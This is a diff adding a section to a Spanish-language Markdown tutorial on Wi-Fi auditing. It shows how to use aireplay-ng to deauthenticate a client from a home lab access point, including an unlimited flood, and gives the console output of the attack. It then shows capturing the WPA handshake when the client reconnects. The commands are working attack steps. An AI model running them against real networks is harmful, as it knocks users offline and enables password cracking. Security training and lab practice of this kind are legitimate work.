@@ -610,6 +610,105 @@ punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **airep
 --test              : tests injection and quality (-9)
 ```
 
+Para este caso, nos interesa el parámetro '**-0**', el cual también puede ser usado con el parámetro
+'**--deauth**'.
+
+La sintaxis sería la siguiente:
+
+* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon
+
+**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
+hacerlo, es probable que el ataque de deautenticación no funcione, pues **aireplay** no sabe sobre qué canal
+operar.
+
+Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
+de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
+especificado 10 paquetes, su valor puede incrementarse al valor deseado. 
+
+Es posible incluso especificar un valor '**0**', haciéndole saber así a **aireplay** que queremos enviar un
+número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:
+
+* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon
+
+Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:
+
+* aireplay-ng -0 0 -a  -c 34:41:5D:46:D1:38 wlan0mon
+
+Obteniendo los siguientes resultados:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar]
+└──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
+20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
+20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
+20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
+20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
+20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
+20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
+20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
+20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
+20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
+20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
+20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
+```
+
+Ahora bien, para saber si nuestros paquetes están surgiendo efecto sobre la estación, el truco está en
+contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
+Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
+a la estación.
+
+Si haces estas practicas en local, podrás comprobar como tu dispositivo en caso de haber sido la estación
+víctima, habría sido desconectado del AP. Ahora bien, aunque lo veremos más adelante, imaginemos que ahora
+paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
+a recordar los puntos de acceso a los que alguna vez han estado conectados. 
+
+Esto es así debido a los paquetes **Probe Request**:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
+   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
+  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
+  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
+  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
+  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
+```
+
+Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
+hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:
+
+```bash
+ CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
+                                                                                                                                                                                       
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                                       
+ 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
+                                                                                                                                                                                       
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
+                                                                                                                                                                                       
+ (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
+ 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
+ ```
+
+ Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la dirección
+ MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
+ que se acaba de reasociar.
+
+ Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.
+
+ #### Ataque de deautenticación global
+
+ 
+
+
+
 
 
 
